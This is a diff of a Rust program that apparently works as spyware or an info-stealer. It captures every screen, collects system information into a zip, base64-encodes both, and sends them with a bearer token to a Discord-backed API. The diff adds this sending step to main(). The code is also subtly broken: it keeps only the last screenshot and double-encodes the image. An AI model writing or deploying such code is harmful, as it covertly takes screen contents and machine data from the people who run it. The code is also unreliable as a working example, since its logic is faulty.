@@ -15,10 +15,38 @@ lazy_static::lazy_static! {
 
 */
 
+// Main function for testing
+fn main() {
+
+    // Create a new system struct
+    let mut sys: System = System::new_all();
+
+    // Refresh this for every loop in thread
+    let current_time: String = chrono::offset::Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
+
+    // Create the new zip file
+    let mut zip = create_zip_file();
+
+    // Take a scrteenshot
+    let image_buffer: String = take_screenshot(&mut zip, &current_time);
+
+    // Get the system information
+    get_sys_info(&mut zip, &mut sys, &current_time);
+
+    // Send the files to discord
+    let image_data: String = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
+    let zip_data: String = format!("data:application/zip;base64,{}", base64::encode(&std::fs::read(ZIP_PATH.to_string() + ".zip").expect("failed to read zip file")).to_string());
+    send_files_to_discord(&image_data, &zip_data)
+}
+
+// Create a new folder with the current time as it's name
+fn create_new_folder(name: &str) {
+    std::fs::create_dir(name).expect("failed to create folder");
+}
 
 // The send_discord_request function is used to send a request
 // to our discord api to send a message to a discord channel.
-fn send_files_to_discord(image: &str, zip_file: &str) {
+fn send_files_to_discord(image_data: &str, zip_data: &str) {
     // Get the bearer token
     let bearer: String = match global::get_bearer() {
         Ok(b) => b,
@@ -35,17 +63,18 @@ fn send_files_to_discord(image: &str, zip_file: &str) {
         .header("access_token", access_token)
         .json(&serde_json::json!({
             "embeds": "{}",
-            "image": image,
-            "zip_file": zip_file
+            "image": image_data,
+            "zip_file": zip_data
         }))
         .send().expect("failed to send discord request");
 }
 
 // Take a screenshot and save it to the current folder
-fn take_screenshot(zip: &mut zip::ZipWriter<std::fs::File>, current_time: &str) {
+fn take_screenshot(zip: &mut zip::ZipWriter<std::fs::File>, current_time: &str) -> String {
     let screens = screenshots::Screen::all().expect("failed to get screens");
 
     // Iterate through all the screens
+    let mut image_to_send_in_api: String = String::new();
     screens.iter().for_each(|s| {
         // Capture the screen and get the image buffer
         let image = s.capture().expect("failed to capture screen");
@@ -59,8 +88,9 @@ fn take_screenshot(zip: &mut zip::ZipWriter<std::fs::File>, current_time: &str) 
         );
 
         // Send this in the request body to our api
-        let image_to_send_in_api : String = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
+        image_to_send_in_api = format!("data:image/png;base64,{}", base64::encode(image_buffer).to_string());
     });
+    return image_to_send_in_api;
 }
 
 // Add a file to the zip file
@@ -91,36 +121,11 @@ fn create_zip_file() -> zip::ZipWriter<std::fs::File> {
     return zip::ZipWriter::new(zip_file);
 }
 
-// Create a new folder with the current time as it's name
-fn create_new_folder(name: &str) {
-    std::fs::create_dir(name).expect("failed to create folder");
-}
-
-// Main function for testing
-fn main() {
-
-    // Create a new system struct
-    let mut sys: System = System::new_all();
-
-    // Refresh this for every loop in thread
-    let current_time: String = chrono::offset::Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
-
-    // Create the new zip file
-    let mut zip = create_zip_file();
-
-    // Take a scrteenshot
-    take_screenshot(&mut zip, &current_time);
-
-    // Get the system information
-    let sys_info: String = get_sys_info(&mut zip, &mut sys, &current_time);
-    println!("{}", sys_info);
-}
-
 // The get_sys_info function is used to get the system information
 // and return it as a string.
 fn get_sys_info(
     zip: &mut zip::ZipWriter<std::fs::File>, sys: &mut System, current_time: &str
-) -> String {
+) {
     // Refresh system information
     sys.refresh_all();
 
@@ -202,7 +207,4 @@ fn get_sys_info(
     add_to_zip_file(
         zip, &format!("{}_sys_info.txt", current_time), &result.as_bytes().to_vec()
     );
-
-    // Return the result string
-    return result;
 }
